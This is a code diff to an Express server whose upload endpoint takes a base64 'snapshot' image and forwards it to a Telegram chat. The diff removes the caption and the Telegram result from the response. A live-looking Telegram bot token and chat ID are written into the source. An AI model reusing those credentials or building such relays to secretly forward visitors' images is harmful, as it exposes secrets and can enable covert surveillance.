@@ -7,7 +7,7 @@ const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Your working Telegram bot token and chat ID
+// Telegram bot token & chat ID (kept exactly as you said)
 const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
 const CHAT_ID = '5574741182';
 
@@ -17,7 +17,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/api/upload-photo', async (req, res) => {
   try {
-    const { dataUrl, caption } = req.body;
+    const { dataUrl } = req.body;
     if (!dataUrl || !dataUrl.startsWith('data:image/')) {
       return res.status(400).json({ ok: false, error: 'Invalid or missing dataUrl' });
     }
@@ -32,7 +32,6 @@ app.post('/api/upload-photo', async (req, res) => {
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', buffer, { filename: 'snapshot.jpg', contentType: mime });
-    if (caption) form.append('caption', caption);
 
     const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
@@ -45,7 +44,7 @@ app.post('/api/upload-photo', async (req, res) => {
       return res.status(500).json({ ok: false, error: 'Telegram API error', telegram: json });
     }
 
-    return res.json({ ok: true, result: json.result });
+    return res.json({ ok: true });
   } catch (err) {
     console.error('Upload error:', err);
     return res.status(500).json({ ok: false, error: String(err) });
